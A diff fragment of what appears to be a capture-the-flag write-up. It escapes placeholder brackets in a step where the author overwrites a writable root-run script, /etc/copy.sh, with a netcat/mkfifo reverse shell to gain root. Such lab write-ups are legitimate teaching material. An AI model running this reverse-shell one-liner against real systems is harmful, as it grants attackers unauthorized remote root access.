@@ -105,7 +105,7 @@ $ ls -al /etc/copy.sh
 and yeah we can edit it, SUPER ! So the first idea tha came in my mind is to get an another reverse shell using this command : 
 - - - 
 <pre> 
-$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 \>/tmp/f' \>/etc/copy.sh
+$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \<local-ip\> 5554 \>/tmp/f' \>/etc/copy.sh
 </pre>
 - - - 
 After setting up the listener and ran the command, I got the root shell ! now it's time the get root flag !! :) finally ! 
